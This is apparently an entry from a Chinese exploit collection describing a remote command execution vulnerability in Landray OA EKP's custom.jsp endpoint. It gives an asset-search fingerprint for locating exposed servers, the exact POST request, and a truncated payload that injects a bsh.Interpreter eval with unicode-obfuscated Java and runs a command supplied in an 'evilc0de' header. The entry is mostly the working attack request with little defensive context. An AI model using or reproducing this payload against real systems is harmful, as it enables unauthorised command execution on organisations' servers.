# 蓝凌OAEKPcustom存在远程命令执行漏洞

- **系统**：蓝凌　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`

**请求体 / payload**
```
evilc0de: echo test
Host:
Content-type: application/x-www-form-urlencoded
Content-Length: 17604
var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void%20method=%22eval%22><string>\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\…（脚本共 35441 字，完整版见原文）
```

**其他**
- 蓝凌OA EKP custom存在远程命令执行漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***